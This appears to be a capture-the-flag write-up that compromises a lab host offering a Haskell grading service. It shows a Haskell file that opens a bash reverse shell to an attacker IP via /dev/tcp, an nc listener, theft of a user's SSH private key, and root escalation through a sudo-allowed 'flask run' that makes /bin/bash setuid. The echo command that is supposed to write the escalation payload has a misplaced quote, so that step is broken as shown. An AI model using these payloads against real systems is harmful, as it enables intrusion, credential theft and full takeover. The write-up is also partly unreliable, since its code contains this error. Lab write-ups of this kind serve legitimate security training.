# Fun with Functional

## 1. Intel

Scan the target with nmap:

`
nmap -sC -sV <ip>
`

**Output:**

```

Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-16 09:01 +0000
Nmap scan report for 10.10.0.11
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
5001/tcp open  http    Werkzeug httpd 3.1.8 (Python 3.13.5)
|_http-title: FUN with functionnal !
|_http-server-header: Werkzeug/3.1.8 Python/3.13.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Inject

There seem to be a website we could visit

On the website, it's creator prompt us to send a .hs file, telling us the website will compile and correct it.

We can assume there is a compiler on another machine, if it is the case, we could inject a reverse shell

```hs
hello.hs

module Main where
import System.Process

main = callCommand "/bin/bash -c 'bash -i >& /dev/tcp/10.8.0.202/4444 0>&1'"

```

Before sending , we listen the port on our machine 

```
nc -lvnp 4444
```

We inject the reverse shell through the file and gain access to the host's machine and gain access.

When going into the home dir, we can find the prof's ssh private key

It grants us the login into their account.

We can save the private key in a file and `chmod 600` it

## Connect

```
ssh -i <ssh_private_file> prof@<ip>
```

## Escalate perms

Now let's check their perms 

```
sudo -l
```

**Output:**

```
Matching Defaults entries for prof on lambda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User prof may run the following commands on lambda:
    (root) NOPASSWD: /usr/local/bin/flask run
```

since `Flask` can run python, we can exploit it


```
mkdir /tmp/veryevildir
echo 'import os; os.system("chmod +s /bin/bash") > /tmp/veryevildir/app.py'
cd /tmp/veryevildir
sudo /usr/local/bin/flask run

/bin/bash -p

```

Now that we are a root user, we can get the file we wanted.